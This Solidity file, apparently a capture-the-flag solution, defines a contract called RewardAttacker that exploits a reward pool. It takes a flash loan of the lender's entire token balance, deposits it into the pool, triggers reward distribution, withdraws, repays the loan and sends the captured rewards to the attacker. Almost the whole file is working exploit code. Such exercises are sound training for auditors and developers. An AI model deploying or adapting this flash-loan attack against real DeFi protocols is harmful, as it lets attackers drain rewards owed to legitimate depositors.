// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface ITheRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function distributeRewards() external returns (uint256 rewards);  
}

interface IFlashLoanerPoolRewarder {
    function flashLoan(uint256 amount) external;   
}


contract RewardAttacker{

    address private player;
    IERC20 private liquidityToken;
    IERC20 private rewardToken;
    IFlashLoanerPoolRewarder private helper;
    ITheRewarderPool private target;

    constructor(address _target, address _helper, address _liquidityToken, address _rewardToken){
        player = msg.sender;
        target = ITheRewarderPool(_target);
        helper = IFlashLoanerPoolRewarder(_helper);
        rewardToken= IERC20(_rewardToken);
        liquidityToken = IERC20(_liquidityToken);
    }

    function attack() external{
        uint amount = liquidityToken.balanceOf(address(helper));
        helper.flashLoan(amount);
        
    }


    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(target), amount);
        target.deposit(amount);
        target.distributeRewards();
        target.withdraw(amount);
        liquidityToken.transfer(address(helper), amount);
        uint rewards = rewardToken.balanceOf(address(this));
        rewardToken.transfer(player, rewards);
    }


}